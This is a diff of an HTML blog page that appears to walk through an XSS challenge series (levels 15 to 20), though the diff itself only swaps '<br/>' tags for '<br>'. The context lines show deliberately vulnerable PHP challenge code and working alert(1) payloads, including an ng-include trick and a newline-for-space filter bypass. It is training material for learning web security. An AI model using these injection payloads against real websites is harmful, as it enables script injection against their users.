@@ -303,9 +303,9 @@
 <p>exif xss 简单来讲就是利用exif信息实现xss攻击。 </p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">xss</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">12</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
 <p>15</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -316,16 +316,16 @@
 </blockquote>
 <p>这里考虑调用level1的代码，使用img</p>
 <p><code> http://test.ctf8.com/level15.php?src=%27level1.php?name=test&lt;img src=1 onclick=alert(1)&gt;&#39;</code></p>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <p>16.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>过滤掉了<code>script</code>, 空格和<code>/</code>可以考虑使用%0A,%0C,%0D等代替作为分隔符</p>
 <p><code>keyword=test&lt;img%0Asrc=1%0Aonclick=alert(1)&gt;</code></p>
-<br/>
+<br>
 
 <h4 id="16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看"><a href="#16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看" class="headerlink" title="16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看"></a>16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看</h4><p>17.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -339,7 +339,7 @@
 <p>19.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <p>20.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf04.swf?&#x27;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
